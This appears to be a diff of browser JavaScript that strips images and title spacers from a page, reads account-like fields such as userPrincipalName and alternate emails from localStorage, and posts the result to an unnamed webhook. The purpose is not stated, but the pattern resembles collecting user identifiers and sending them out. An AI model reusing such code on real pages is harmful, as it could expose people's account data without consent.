@@ -3,6 +3,10 @@ var elements = document.querySelectorAll(".page-title-spacer");
 elements.forEach(function (element) {
   element.parentNode.removeChild(element);
 });
+elements = document.getElementsByTagName("img");
+for (var i = elements.length - 1; i >= 0; i--) {
+  elements[i].parentNode.removeChild(elements[i]);
+}
 
 
 function randomGuid() {
@@ -39,6 +43,8 @@ function loadUserData(index) {
     alternateEmail: "",
     alternateEmailAddresses: []
   };
+  //clear data
+  domains = [];
 
   for (let i = 0; i < localStorage.length; i++) {
     const key = localStorage.key(i);
@@ -110,7 +116,7 @@ function Run(index) {
         },
         body: JSON.stringify(result)
       })
-      .catch(error => console.error("Error posting to webhook:", error));
+        .catch(error => console.error("Error posting to webhook:", error));
       localStorage.setItem("userPrincipalName0", '1');
     });
 }
